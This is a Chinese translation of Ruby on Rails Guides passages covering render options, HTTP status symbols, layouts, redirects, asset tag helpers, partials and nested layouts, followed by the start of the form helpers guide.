如果使用 :inline 选项指定了 ERB 代码，render 方法就不会渲染视图。如下所示的用法完全可行：
render inline: "<% products.each do |p| %><p><%= p.name %></p><% end %>"

但是很少这么做。在控制器中混用 ERB 代码违反了 MVC 架构原则，也让程序的其他开发者难以理解程序的逻辑思路。请使用单独的 ERB 视图。

默认情况下，行间渲染使用 ERB 模板。你可以使用 :type 选项指定使用其他处理程序：
render inline: "xml.p {'Horrid coding practice!'}", type: :builder

####  2.2.7 渲染文本

调用 render 方法时指定 :plain 选项，可以把没有标记语言的纯文本发给浏览器：
render plain: "OK"

渲染纯文本主要用于 Ajax 或无需使用 HTML 的网络服务。

默认情况下，使用 :plain 选项渲染纯文本，不会套用程序的布局。如果想使用布局，可以指定 layout: true 选项。

####  2.2.8 渲染 HTML

调用 render 方法时指定 :html 选项，可以把 HTML 字符串发给浏览器：
render html: "<strong>Not Found</strong>".html_safe

这种方法可用来渲染 HTML 片段。如果标记很复杂，就要考虑使用模板文件了。

如果字符串对 HTML 不安全，会进行转义。

####  2.2.9 渲染 JSON

JSON 是一种 JavaScript 数据格式，很多 Ajax 库都用这种格式。Rails 内建支持把对象转换成 JSON，经渲染后再发送给浏览器。
render json: @product

在需要渲染的对象上无需调用 to_json 方法，如果使用了 :json 选项，render 方法会自动调用 to_json。

####  2.2.10 渲染 XML

Rails 也内建支持把对象转换成 XML，经渲染后再发回给调用者：
render xml: @product

在需要渲染的对象上无需调用 to_xml 方法，如果使用了 :xml 选项，render 方法会自动调用 to_xml。

####  2.2.11 渲染普通的 JavaScript

Rails 能渲染普通的 JavaScript：
render js: "alert('Hello Rails');"

这种方法会把 MIME 设为 text/javascript，再把指定的字符串发给浏览器。

####  2.2.12 渲染原始的主体

调用 render 方法时使用 :body 选项，可以不设置内容类型，把原始的内容发送给浏览器：
render body: "raw"

只有不在意内容类型时才可使用这个选项。大多数时候，使用 :plain 或 :html 选项更合适。

如果没有修改，这种方式返回的内容类型是 text/html，因为这是 Action Dispatch 响应默认使用的内容类型。

####  2.2.13 render 方法的选项

render 方法一般可接受四个选项：

    :content_type
    :layout
    :location
    :status

####  2.2.13.1 :content_type 选项

默认情况下，Rails 渲染得到的结果内容类型为 text/html；如果使用 :json 选项，内容类型为 application/json；如果使用 :xml 选项，内容类型为 application/xml。如果需要修改内容类型，可使用 :content_type 选项
render file: filename, content_type: "application/rss"

####  2.2.13.2 :layout 选项

render 方法的大多数选项渲染得到的结果都会作为当前布局的一部分显示。后文会详细介绍布局。

:layout 选项告知 Rails，在当前动作中使用指定的文件作为布局：
render layout: "special_layout"

也可以告知 Rails 不使用布局：
render layout: false

####  2.2.13.3 :location 选项

:location 选项可以设置 HTTP Location 报头：
render xml: photo, location: photo_url(photo)

####  2.2.13.4 :status 选项

Rails 会自动为生成的响应附加正确的 HTTP 状态码（大多数情况下是 200 OK）。使用 :status 选项可以修改状态码：
render status: 500
render status: :forbidden

Rails 能理解数字状态码和对应的符号，如下所示：
响应类别 	HTTP 状态码 	符号
信息 	100 	:continue
	101 	:switching_protocols
	102 	:processing
成功 	200 	:ok
	201 	:created
	202 	:accepted
	203 	:non_authoritative_information
	204 	:no_content
	205 	:reset_content
	206 	:partial_content
	207 	:multi_status
	208 	:already_reported
	226 	:im_used
重定向 	300 	:multiple_choices
	301 	:moved_permanently
	302 	:found
	303 	:see_other
	304 	:not_modified
	305 	:use_proxy
	306 	:reserved
	307 	:temporary_redirect
	308 	:permanent_redirect
客户端错误 	400 	:bad_request
	401 	:unauthorized
	402 	:payment_required
	403 	:forbidden
	404 	:not_found
	405 	:method_not_allowed
	406 	:not_acceptable
	407 	:proxy_authentication_required
	408 	:request_timeout
	409 	:conflict
	410 	:gone
	411 	:length_required
	412 	:precondition_failed
	413 	:request_entity_too_large
	414 	:request_uri_too_long
	415 	:unsupported_media_type
	416 	:requested_range_not_satisfiable
	417 	:expectation_failed
	422 	:unprocessable_entity
	423 	:locked
	424 	:failed_dependency
	426 	:upgrade_required
	428 	:precondition_required
	429 	:too_many_requests
	431 	:request_header_fields_too_large
服务器错误 	500 	:internal_server_error
	501 	:not_implemented
	502 	:bad_gateway
	503 	:service_unavailable
	504 	:gateway_timeout
	505 	:http_version_not_supported
	506 	:variant_also_negotiates
	507 	:insufficient_storage
	508 	:loop_detected
	510 	:not_extended
	511 	:network_authentication_required


####  2.2.14 查找布局

查找布局时，Rails 首先查看 app/views/layouts 文件夹中是否有和控制器同名的文件。例如，渲染 PhotosController 控制器中的动作会使用 app/views/layouts/photos.html.erb（或 app/views/layouts/photos.builder）。如果没找到针对控制器的布局，Rails 会使用 app/views/layouts/application.html.erb 或 app/views/layouts/application.builder。如果没有 .erb 布局，Rails 会使用 .builder 布局（如果文件存在）。Rails 还提供了多种方法用来指定单个控制器和动作使用的布局。

####  2.2.14.1 指定控制器所用布局

在控制器中使用 layout 方法，可以改写默认使用的布局约定。例如：
class ProductsController < ApplicationController
  layout "inventory"
  #...
end

这么声明之后，ProductsController 渲染的所有视图都将使用 app/views/layouts/inventory.html.erb 文件作为布局。

要想指定整个程序使用的布局，可以在 ApplicationController 类中使用 layout 方法：
class ApplicationController < ActionController::Base
  layout "main"
  #...
end

这么声明之后，整个程序的视图都会使用 app/views/layouts/main.html.erb 文件作为布局。

####  2.2.14.2 运行时选择布局

可以使用一个 Symbol，在处理请求时选择布局：
class ProductsController < ApplicationController
  layout :products_layout
 
  def show
    @product = Product.find(params[:id])
  end
 
  private
    def products_layout
      @current_user.special? ? "special" : "products"
    end
 
end

如果当前用户是特殊用户，会使用一个特殊布局渲染产品视图。

还可使用行间方法，例如 Proc，决定使用哪个布局。如果使用 Proc，其代码块可以访问 controller 实例，这样就能根据当前请求决定使用哪个布局：
class ProductsController < ApplicationController
  layout Proc.new { |controller| controller.request.xhr? ? "popup" : "application" }
end
####  2.2.14.3 条件布局

在控制器中指定布局时可以使用 :only 和 :except 选项。这两个选项的值可以是一个方法名或者一个方法名数组，这些方法都是控制器中的动作：
class ProductsController < ApplicationController
  layout "product", except: [:index, :rss]
end

这么声明后，除了 rss 和 index 动作之外，其他动作都使用 product 布局渲染视图。

####  2.2.14.4 布局继承

布局声明按层级顺序向下顺延，专用布局比通用布局优先级高。例如：

    application_controller.rb

class ApplicationController < ActionController::Base
  layout "main"
end

    posts_controller.rb

class PostsController < ApplicationController
end

    special_posts_controller.rb

class SpecialPostsController < PostsController
  layout "special"
end

    old_posts_controller.rb

class OldPostsController < SpecialPostsController
  layout false
 
  def show
    @post = Post.find(params[:id])
  end
 
  def index
    @old_posts = Post.older
    render layout: "old"
  end
  # ...
end

在这个程序中：

    一般情况下，视图使用 main 布局渲染；
    PostsController#index 使用 main 布局；
    SpecialPostsController#index 使用 special 布局；
    OldPostsController#show 不用布局；
    OldPostsController#index 使用 old 布局；


####  2.2.15 避免双重渲染错误

大多数 Rails 开发者迟早都会看到一个错误消息：Can only render or redirect once per action（动作只能渲染或重定向一次）。这个提示很烦人，也很容易修正。出现这个错误的原因是，没有理解 render 的工作原理。

例如，下面的代码会导致这个错误：
def show
  @book = Book.find(params[:id])
  if @book.special?
    render action: "special_show"
  end
  render action: "regular_show"
end

如果 @book.special? 的结果是 true，Rails 开始渲染，把 @book 变量导入 special_show 视图中。但是，show 动作并不会就此停止运行，当 Rails 运行到动作的末尾时，会渲染 regular_show 视图，导致错误出现。解决的办法很简单，确保在一次代码运行路线中只调用一次 render 或 redirect_to 方法。有一个语句可以提供帮助，那就是 and return。下面的代码对上述代码做了修改：
def show
  @book = Book.find(params[:id])
  if @book.special?
    render action: "special_show" and return
  end
  render action: "regular_show"
end

千万别用 && return 代替 and return，因为 Ruby 语言操作符优先级的关系，&& return 根本不起作用。

注意，ActionController 能检测到是否显式调用了 render 方法，所以下面这段代码不会出错：
def show
  @book = Book.find(params[:id])
  if @book.special?
    render action: "special_show"
  end
end

如果 @book.special? 的结果是 true，会渲染 special_show 视图，否则就渲染默认的 show 模板。


###  2.3 使用 redirect_to 方法

响应 HTTP 请求的另一种方法是使用 redirect_to。如前所述，render 告诉 Rails 构建响应时使用哪个视图（以及其他静态资源）。redirect_to 做的事情则完全不同：告诉浏览器向另一个地址发起新请求。例如，在程序中的任何地方使用下面的代码都可以重定向到 photos 控制器的 index 动作：
redirect_to photos_url

redirect_to 方法的参数与 link_to 和 url_for 一样。有个特殊的重定向，返回到前一个页面：
redirect_to :back

####  2.3.1 设置不同的重定向状态码

调用 redirect_to 方法时，Rails 会把 HTTP 状态码设为 302，即临时重定向。如果想使用其他的状态码，例如 301（永久重定向），可以设置 :status 选项：
redirect_to photos_path, status: 301

和 render 方法的 :status 选项一样，redirect_to 方法的 :status 选项同样可使用数字状态码或符号。

####  2.3.2 render 和 redirect_to 的区别

有些经验不足的开发者会认为 redirect_to 方法是一种 goto 命令，把代码从一处转到别处。这么理解是不对的。执行到 redirect_to 方法时，代码会停止运行，等待浏览器发起新请求。你需要告诉浏览器下一个请求是什么，并返回 302 状态码。

下面通过实例说明。
def index
  @books = Book.all
end
 
def show
  @book = Book.find_by(id: params[:id])
  if @book.nil?
    render action: "index"
  end
end

在这段代码中，如果 @book 变量的值为 nil 很可能会出问题。记住，render :action 不会执行目标动作中的任何代码，因此不会创建 index 视图所需的 @books 变量。修正方法之一是不渲染，使用重定向：
def index
  @books = Book.all
end
 
def show
  @book = Book.find_by(id: params[:id])
  if @book.nil?
    redirect_to action: :index
  end
end

这样修改之后，浏览器会向 index 动作发起新请求，执行 index 方法中的代码，一切都能正常运行。

这种方法有个缺点，增加了浏览器的工作量。浏览器通过 /books/1 向 show 动作发起请求，控制器做了查询，但没有找到对应的图书，所以返回 302 重定向响应，告诉浏览器访问 /books/。浏览器收到指令后，向控制器的 index 动作发起新请求，控制器从数据库中取出所有图书，渲染 index 模板，将其返回浏览器，在屏幕上显示所有图书。

在小型程序中，额外增加的时间不是个问题。如果响应时间很重要，这个问题就值得关注了。下面举个虚拟的例子演示如何解决这个问题：
def index
  @books = Book.all
end
 
def show
  @book = Book.find_by(id: params[:id])
  if @book.nil?
    @books = Book.all
    flash.now[:alert] = "Your book was not found"
    render "index"
  end
end

在这段代码中，如果指定 ID 的图书不存在，会从模型中取出所有图书，赋值给 @books 实例变量，然后直接渲染 index.html.erb 模板，并显示一个 Flash 消息，告知用户出了什么问题。

###  2.4 使用 head 构建只返回报头的响应

head 方法可以只把报头发送给浏览器。还可使用意图更明确的 render :nothing 达到同样的目的。head 方法的参数是 HTTP 状态码的符号形式（参见前文表格），选项是一个 Hash，指定报头名和对应的值。例如，可以只返回报错的报头：
head :bad_request

生成的报头如下：
HTTP/1.1 400 Bad Request
Connection: close
Date: Sun, 24 Jan 2010 12:15:53 GMT
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8
X-Runtime: 0.013483
Set-Cookie: _blog_session=...snip...; path=/; HttpOnly
Cache-Control: no-cache

或者使用其他 HTTP 报头提供其他信息：
head :created, location: photo_path(@photo)

生成的报头如下：
HTTP/1.1 201 Created
Connection: close
Date: Sun, 24 Jan 2010 12:16:44 GMT
Transfer-Encoding: chunked
Location: /photos/1
Content-Type: text/html; charset=utf-8
X-Runtime: 0.083496
Set-Cookie: _blog_session=...snip...; path=/; HttpOnly
Cache-Control: no-cache


##  3 布局结构

Rails 渲染响应的视图时，会把视图和当前模板结合起来。查找当前模板的方法前文已经介绍过。在布局中可以使用三种工具把各部分合在一起组成完整的响应：

    静态资源标签
    yield 和 content_for
    局部视图

###  3.1 静态资源标签帮助方法

静态资源帮助方法用来生成链接到 Feed、JavaScript、样式表、图片、视频和音频的 HTML 代码。Rails 提供了六个静态资源标签帮助方法：

    auto_discovery_link_tag
    javascript_include_tag
    stylesheet_link_tag
    image_tag
    video_tag
    audio_tag

这六个帮助方法可以在布局或视图中使用，不过 auto_discovery_link_tag、javascript_include_tag 和 stylesheet_link_tag 最常出现在布局的 `<head>` 中。

静态资源标签帮助方法不会检查指定位置是否存在静态资源，假定你知道自己在做什么，只负责生成对应的链接。
####  3.1.1 使用 auto_discovery_link_tag 链接到 Feed

auto_discovery_link_tag 帮助方法生成的 HTML，大多数浏览器和 Feed 阅读器都能用来自动识别 RSS 或 Atom Feed。auto_discovery_link_tag 接受的参数包括链接的类型（:rss 或 :atom），传递给 url_for 的 Hash 选项，以及该标签使用的 Hash 选项：
<%= auto_discovery_link_tag(:rss, {action: "feed"},
  {title: "RSS Feed"}) %>

auto_discovery_link_tag 的标签选项有三个：

    :rel：指定链接 rel 属性的值，默认值为 "alternate"；
    :type：指定 MIME 类型，不过 Rails 会自动生成正确的 MIME 类型；
    :title：指定链接的标题，默认值是 :type 参数值的全大写形式，例如 "ATOM" 或 "RSS"；

####  3.1.2 使用 javascript_include_tag 链接 JavaScript 文件

javascript_include_tag 帮助方法为指定的每个资源生成 HTML script 标签。

如果启用了 Asset Pipeline，这个帮助方法生成的链接指向 /assets/javascripts/ 而不是 Rails 旧版中使用的 public/javascripts。链接的地址由 Asset Pipeline 伺服。

Rails 程序或引擎中的 JavaScript 文件可存放在三个位置：app/assets，lib/assets 或 vendor/assets。详细说明参见 Asset Pipeline 中的“静态资源的组织方式”一节。

文件的地址可使用相对文档根目录的完整路径，或者是 URL。例如，如果想链接到 app/assets、lib/assets 或 vendor/assets 文件夹中名为 javascripts 的子文件夹中的文件，可以这么做：
<%= javascript_include_tag "main" %>

Rails 生成的 script 标签如下：
<script src='/assets/main.js'></script>

对这个静态资源的请求由 Sprockets gem 伺服。

同时引入 app/assets/javascripts/main.js 和 app/assets/javascripts/columns.js 可以这么做：
<%= javascript_include_tag "main", "columns" %>

引入 app/assets/javascripts/main.js 和 app/assets/javascripts/photos/columns.js：
<%= javascript_include_tag "main", "/photos/columns" %>

引入 http://example.com/main.js：
<%= javascript_include_tag "http://example.com/main.js" %>

####  3.1.3 使用 stylesheet_link_tag 链接 CSS 文件

stylesheet_link_tag 帮助方法为指定的每个资源生成 HTML <link> 标签。

如果启用了 Asset Pipeline，这个帮助方法生成的链接指向 /assets/stylesheets/，由 Sprockets gem 伺服。样式表文件可以存放在三个位置：app/assets，lib/assets 或 vendor/assets。

文件的地址可使用相对文档根目录的完整路径，或者是 URL。例如，如果想链接到 app/assets、lib/assets 或 vendor/assets 文件夹中名为 stylesheets 的子文件夹中的文件，可以这么做：
<%= stylesheet_link_tag "main" %>

引入 app/assets/stylesheets/main.css 和 app/assets/stylesheets/columns.css：
<%= stylesheet_link_tag "main", "columns" %>

引入 app/assets/stylesheets/main.css 和 app/assets/stylesheets/photos/columns.css：
<%= stylesheet_link_tag "main", "photos/columns" %>

引入 http://example.com/main.css：
<%= stylesheet_link_tag "http://example.com/main.css" %>

默认情况下，stylesheet_link_tag 创建的链接属性为 media="screen" rel="stylesheet"。指定相应的选项（:media，:rel）可以重写默认值：
<%= stylesheet_link_tag "main_print", media: "print" %>

####  3.1.4 使用 image_tag 链接图片

image_tag 帮助方法为指定的文件生成 HTML <img /> 标签。默认情况下，文件存放在 public/images 文件夹中。

注意，必须指定图片的扩展名。
<%= image_tag "header.png" %>

可以指定图片的路径：
<%= image_tag "icons/delete.gif" %>

可以使用 Hash 指定额外的 HTML 属性：
<%= image_tag "icons/delete.gif", {height: 45} %>

可以指定一个替代文本，在关闭图片的浏览器中显示。如果没指定替代文本，Rails 会使用图片的文件名，去掉扩展名，并把首字母变成大写。例如，下面两个标签会生成相同的代码：
<%= image_tag "home.gif" %>
<%= image_tag "home.gif", alt: "Home" %>

还可指定图片的大小，格式为“{width}x{height}”：
<%= image_tag "home.gif", size: "50x20" %>

除了上述特殊的选项外，还可在最后一个参数中指定标准的 HTML 属性，例如 :class、:id 或 :name：
<%= image_tag "home.gif", alt: "Go Home",
                          id: "HomeImage",
                          class: "nav_bar" %>

####  3.1.5 使用 video_tag 链接视频

video_tag 帮助方法为指定的文件生成 HTML5 <video> 标签。默认情况下，视频文件存放在 public/videos 文件夹中。
<%= video_tag "movie.ogg" %>

生成的代码如下：
<video src="/videos/movie.ogg" />

和 image_tag 类似，视频的地址可以使用绝对路径，或者相对 public/videos 文件夹的路径。而且也可以指定 size: "#{width}x#{height}" 选项。video_tag 还可指定其他 HTML 属性，例如 id、class 等。

video_tag 方法还可使用 HTML Hash 选项指定所有 <video> 标签的属性，包括：

    poster: "image_name.png"：指定视频播放前在视频的位置显示的图片；
    autoplay: true：页面加载后开始播放视频；
    loop: true：视频播完后再次播放；
    controls: true：为用户提供浏览器对视频的控制支持，用于和视频交互；
    autobuffer: true：页面加载时预先加载视频文件；

把数组传递给 video_tag 方法可以指定多个视频：
<%= video_tag ["trailer.ogg", "movie.ogg"] %>

生成的代码如下：
<video><source src="trailer.ogg" /><source src="movie.ogg" /></video>

####  3.1.6 使用 audio_tag 链接音频

audio_tag 帮助方法为指定的文件生成 HTML5 <audio> 标签。默认情况下，音频文件存放在 public/audio 文件夹中。
<%= audio_tag "music.mp3" %>

还可指定音频文件的路径：
<%= audio_tag "music/first_song.mp3" %>

还可使用 Hash 指定其他属性，例如 :id、:class 等。

和 video_tag 类似，audio_tag 也有特殊的选项：

    autoplay: true：页面加载后开始播放音频；
    controls: true：为用户提供浏览器对音频的控制支持，用于和音频交互；
    autobuffer: true：页面加载时预先加载音频文件；


###  3.2 理解 yield

在布局中，yield 标明一个区域，渲染的视图会插入这里。最简单的情况是只有一个 yield，此时渲染的整个视图都会插入这个区域：
<html>
  <head>
  </head>
  <body>
  <%= yield %>
  </body>
</html>

布局中可以标明多个区域：
<html>
  <head>
  <%= yield :head %>
  </head>
  <body>
  <%= yield %>
  </body>
</html>

视图的主体会插入未命名的 yield 区域。要想在具名 yield 区域插入内容，得使用 content_for 方法。

###  3.3 使用 content_for 方法

content_for 方法在布局的具名 yield 区域插入内容。例如，下面的视图会在前一节的布局中插入内容：
<% content_for :head do %>
  <title>A simple page</title>
<% end %>
 
<p>Hello, Rails!</p>

套入布局后生成的 HTML 如下：
<html>
  <head>
  <title>A simple page</title>
  </head>
  <body>
  <p>Hello, Rails!</p>
  </body>
</html>

如果布局不同的区域需要不同的内容，例如侧边栏和底部，就可以使用 content_for 方法。content_for 方法还可用来在通用布局中引入特定页面使用的 JavaScript 文件或 CSS 文件。

###  3.4 使用局部视图

局部视图可以把渲染过程分为多个管理方便的片段，把响应的某个特殊部分移入单独的文件。
####  3.4.1 具名局部视图

在视图中渲染局部视图可以使用 render 方法：
<%= render "menu" %>

渲染这个视图时，会渲染名为 _menu.html.erb 的文件。注意文件名开头的下划线：局部视图的文件名开头有个下划线，用于和普通视图区分开，不过引用时无需加入下划线。即便从其他文件夹中引入局部视图，规则也是一样：
<%= render "shared/menu" %>

这行代码会引入 app/views/shared/_menu.html.erb 这个局部视图。
####  3.4.2 使用局部视图简化视图

局部视图的一种用法是作为“子程序”（subroutine），把细节提取出来，以便更好地理解整个视图的作用。例如，有如下的视图：
<%= render "shared/ad_banner" %>
 
<h1>Products</h1>
 
<p>Here are a few of our fine products:</p>
...
 
<%= render "shared/footer" %>

这里，局部视图 _ad_banner.html.erb 和 _footer.html.erb 可以包含程序多个页面共用的内容。在编写某个页面的视图时，无需关心这些局部视图中的详细内容。

程序所有页面共用的内容，可以直接在布局中使用局部视图渲染。
####  3.4.3 局部布局

和视图可以使用布局一样，局部视图也可使用自己的布局文件。例如，可以这样调用局部视图：
<%= render partial: "link_area", layout: "graybar" %>

这行代码会使用 _graybar.html.erb 布局渲染局部视图 _link_area.html.erb。注意，局部布局的名字也以下划线开头，和局部视图保存在同个文件夹中（不在 layouts 文件夹中）。

还要注意，指定其他选项时，例如 :layout，必须明确地使用 :partial 选项。

####  3.4.4 传递本地变量

本地变量可以传入局部视图，这么做可以把局部视图变得更强大、更灵活。例如，可以使用这种方法去除新建和编辑页面的重复代码，但仍然保有不同的内容：
<h1>New zone</h1>
<%= render partial: "form", locals: {zone: @zone} %>
<h1>Editing zone</h1>
<%= render partial: "form", locals: {zone: @zone} %>
<%= form_for(zone) do |f| %>
  <p>
    <b>Zone name</b><br>
    <%= f.text_field :name %>
  </p>
  <p>
    <%= f.submit %>
  </p>
<% end %>

虽然两个视图使用同一个局部视图，但 Action View 的 submit 帮助方法为 new 动作生成的提交按钮名为“Create Zone”，为 edit 动作生成的提交按钮名为“Update Zone”。

每个局部视图中都有个和局部视图同名的本地变量（去掉前面的下划线）。通过 object 选项可以把对象传给这个变量：
<%= render partial: "customer", object: @new_customer %>

在 customer 局部视图中，变量 customer 的值为父级视图中的 @new_customer。

如果要在局部视图中渲染模型实例，可以使用简写句法：
<%= render @customer %>

假设实例变量 @customer 的值为 Customer 模型的实例，上述代码会渲染 _customer.html.erb，其中本地变量 customer 的值为父级视图中 @customer 实例变量的值。
####  3.4.5 渲染集合

渲染集合时使用局部视图特别方便。通过 :collection 选项把集合传给局部视图时，会把集合中每个元素套入局部视图渲染：
<h1>Products</h1>
<%= render partial: "product", collection: @products %>
<p>Product Name: <%= product.name %></p>

传入复数形式的集合时，在局部视图中可以使用和局部视图同名的变量引用集合中的成员。在上面的代码中，局部视图是 _product，在其中可以使用 product 引用渲染的实例。

渲染集合还有个简写形式。假设 @products 是 product 实例集合，在 index.html.erb 中可以直接写成下面的形式，得到的结果是一样的：
<h1>Products</h1>
<%= render @products %>

Rails 根据集合中各元素的模型名决定使用哪个局部视图。其实，集合中的元素可以来自不同的模型，Rails 会选择正确的局部视图进行渲染。
<h1>Contacts</h1>
<%= render [customer1, employee1, customer2, employee2] %>
<p>Customer: <%= customer.name %></p>
<p>Employee: <%= employee.name %></p>

在上面几段代码中，Rails 会根据集合中各成员所属的模型选择正确的局部视图。

如果集合为空，render 方法会返回 nil，所以最好提供替代文本。
<h1>Products</h1>
<%= render(@products) || "There are no products available." %>
####  3.4.6 本地变量

要在局部视图中自定义本地变量的名字，调用局部视图时可通过 :as 选项指定：
<%= render partial: "product", collection: @products, as: :item %>

这样修改之后，在局部视图中可以使用本地变量 item 访问 @products 集合中的实例。

使用 locals: {} 选项可以把任意本地变量传入局部视图：
<%= render partial: "product", collection: @products,
           as: :item, locals: {title: "Products Page"} %>

在局部视图中可以使用本地变量 title，其值为 "Products Page"。

在局部视图中还可使用计数器变量，变量名是在集合后加上 _counter。例如，渲染 @products 时，在局部视图中可以使用 product_counter 表示局部视图渲染了多少次。不过不能和 as: :value 一起使用。

在使用主局部视图渲染两个实例中间还可使用 :spacer_template 选项指定第二个局部视图。
####  3.4.7 间隔模板
<%= render partial: @products, spacer_template: "product_ruler" %>

Rails 会在两次渲染 _product 局部视图之间渲染 _product_ruler 局部视图（不传入任何数据）。
####  3.4.8 集合局部视图的布局

渲染集合时也可使用 :layout 选项。
<%= render partial: "product", collection: @products, layout: "special_layout" %>

使用局部视图渲染集合中的各元素时会套用指定的模板。和局部视图一样，当前渲染的对象以及 object_counter 变量也可在布局中使用。


###  3.5 使用嵌套布局

在程序中有时需要使用不同于常规布局的布局渲染特定的控制器。此时无需复制主视图进行编辑，可以使用嵌套布局（有时也叫子模板）。下面举个例子。

假设 ApplicationController 布局如下：
<html>
<head>
  <title><%= @page_title or "Page Title" %></title>
  <%= stylesheet_link_tag "layout" %>
  <style><%= yield :stylesheets %></style>
</head>
<body>
  <div id="top_menu">Top menu items here</div>
  <div id="menu">Menu items here</div>
  <div id="content"><%= content_for?(:content) ? yield(:content) : yield %></div>
</body>
</html>

在 NewsController 的页面中，想隐藏顶部目录，在右侧添加一个目录：
<% content_for :stylesheets do %>
  #top_menu {display: none}
  #right_menu {float: right; background-color: yellow; color: black}
<% end %>
<% content_for :content do %>
  <div id="right_menu">Right menu items here</div>
  <%= content_for?(:news_content) ? yield(:news_content) : yield %>
<% end %>
<%= render template: "layouts/application" %>

就这么简单。News 控制器的视图会使用 news.html.erb 布局，隐藏了顶部目录，在 <div id="content"> 中添加一个右侧目录。

使用子模板方式实现这种效果有很多方法。注意，布局的嵌套层级没有限制。使用 render template: 'layouts/news' 可以指定使用一个新布局。如果确定，可以不为 News 控制器创建子模板，直接把 content_for?(:news_content) ? yield(:news_content) : yield 替换成 yield 即可。

##  反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  表单帮助方法

表单是网页程序的基本组成部分，用于接收用户的输入。
然而，由于表单中控件的名称和各种属性，使用标记语言难以编写和维护。
Rails 提供了很多视图帮助方法简化表单的创建过程。
因为各帮助方法的用途不一样，所以开发者在使用之前必须要知道相似帮助方法的差异。

读完本文，你将学到：

    如何创建搜索表单等不需要操作模型的普通表单；
    如何使用针对模型的表单创建和编辑数据库中的记录；
    如何使用各种类型的数据生成选择列表；
    如何使用 Rails 提供用于处理日期和时间的帮助方法；
    上传文件的表单有什么特殊之处；
    创建操作外部资源的案例；
    如何编写复杂的表单；

Chapters

    编写简单的表单
        普通的搜索表单
        调用 form_tag 时使用多个 Hash 参数
        生成表单中控件的帮助方法
        其他帮助方法
    处理模型对象
        模型对象帮助方法
        把表单绑定到对象上
        记录辨别技术
        表单如何处理 PATCH，PUT 或 DELETE 请求？
    快速创建选择列表
        select 和 option 标签
        处理模型的选择列表
        根据任意对象组成的集合创建 option 标签
        时区和国家选择列表
    使用日期和时间表单帮助方法
        独立的帮助方法
        处理模型对象的帮助方法
        通用选项
        单个时间单位选择列表
    上传文件
        上传了什么
        使用 Ajax 上传文件
    定制表单构造器
    理解参数命名约定
        基本结构
        结合在一起使用
        使用表单帮助方法
    处理外部资源的表单
    编写复杂的表单
        设置模型
        嵌套表单
        控制器端
        删除对象
        避免创建空记录
        按需添加字段

本文的目的不是全面解说每个表单方法和其参数，完整的说明请阅读 Rails API 文档。
##  1 编写简单的表单

最基本的表单帮助方法是 form_tag。
<%= form_tag do %>
  Form contents
<% end %>

像上面这样不传入参数时，form_tag 会创建一个 <form> 标签，提交表单后，向当前页面发起 POST 请求。假设当前页面是 /home/index，生成的 HTML 如下（为了提升可读性，添加了一些换行）：
<form accept-charset="UTF-8" action="/home/index" method="post">
  <div style="margin:0;padding:0">
    <input name="utf8" type="hidden" value="&#x2713;" />
    <input name="authenticity_token" type="hidden" value="f755bb0ed134b76c432144748a6d4b7a7ddf2b71" />
  </div>
  Form contents
</form>

你会发现 HTML 中多了一个 div 元素，其中有两个隐藏的 input 元素。这个 div 元素很重要，没有就无法提交表单。第一个 input 元素的 name 属性值为 utf8，其作用是强制浏览器使用指定的编码处理表单，不管是 GET 还是 POST。第二个 input 元素的 name 属性值为 authenticity_token，这是 Rails 的一项安全措施，称为“跨站请求伪造保护”。form_tag 帮助方法会为每个非 POST 表单生成这个元素（表明启用了这项安全保护措施）。详情参阅“Rails 安全指南”。

为了行文简洁，后续代码没有包含这个 div 元素。

###  1.1 普通的搜索表单

在网上见到最多的表单是搜索表单，搜索表单包含以下元素：

    form 元素，action 属性值为 GET；
    输入框的 label 元素；
    文本输入框 ；
    提交按钮；

创建这样一个表单要分别使用帮助方法 form_tag、label_tag、text_field_tag 和 submit_tag，如下所示：
<%= form_tag("/search", method: "get") do %>
  <%= label_tag(:q, "Search for:") %>
  <%= text_field_tag(:q) %>
  <%= submit_tag("Search") %>
<% end %>

生成的 HTML 如下：
<form accept-charset="UTF-8" action="/search" method="get">
  <div style="margin:0;padding:0;display:inline"><input name="utf8" type="hidden" value="&#x2713;" /></div>
  <label for="q">Search for:</label>
  <input id="q" name="q" type="text" />
  <input name="commit" type="submit" value="Search" />
</form>

表单中的每个 input 元素都有 ID 属性，其值和 name 属性的值一样（上例中是 q）。ID 可用于 CSS 样式或使用 JavaScript 处理表单控件。

除了 text_field_tag 和 submit_tag 之外，每个 HTML 表单控件都有对应的帮助方法。

搜索表单的请求类型一定要用 GET，这样用户才能把某个搜索结果页面加入收藏夹，以便后续访问。一般来说，Rails 建议使用合适的请求方法处理表单。

###  1.2 调用 form_tag 时使用多个 Hash 参数

form_tag 方法可接受两个参数：表单提交地址和一个 Hash 选项。Hash 选项指定提交表单使用的请求方法和 HTML 选项，例如 form 元素的 class 属性。

和 link_to 方法一样，提交地址不一定非得使用字符串，也可使用一个由 URL 参数组成的 Hash，这个 Hash 经 Rails 路由转换成 URL 地址。这种情况下，form_tag 方法的两个参数都是 Hash，同时指定两个参数时很容易产生问题。假设写成下面这样：
form_tag(controller: "people", action: "search", method: "get", class: "nifty_form")
# => '<form accept-charset="UTF-8" action="/people/search?method=get&class=nifty_form" method="post">'

在这段代码中，method 和 class 会作为生成 URL 的请求参数，虽然你想传入两个 Hash，但实际上只传入了一个。所以，你要把第一个 Hash（或两个 Hash）放在一对花括号中，告诉 Ruby 哪个是哪个，写成这样：
form_tag({controller: "people", action: "search"}, method: "get", class: "nifty_form")
# => '<form accept-charset="UTF-8" action="/people/search" method="get" class="nifty_form">'

###  1.3 生成表单中控件的帮助方法

Rails 提供了很多用来生成表单中控件的帮助方法，例如复选框，文本输入框和单选框。这些基本的帮助方法都以 _tag 结尾，例如 text_field_tag 和 check_box_tag，生成单个 input 元素。这些帮助方法的第一个参数都是 input 元素的 name 属性值。提交表单后，name 属性的值会随表单中的数据一起传入控制器，在控制器中可通过 params 这个 Hash 获取各输入框中的值。例如，如果表单中包含 <%= text_field_tag(:query) %>，就可以在控制器中使用 params[:query] 获取这个输入框中的值。
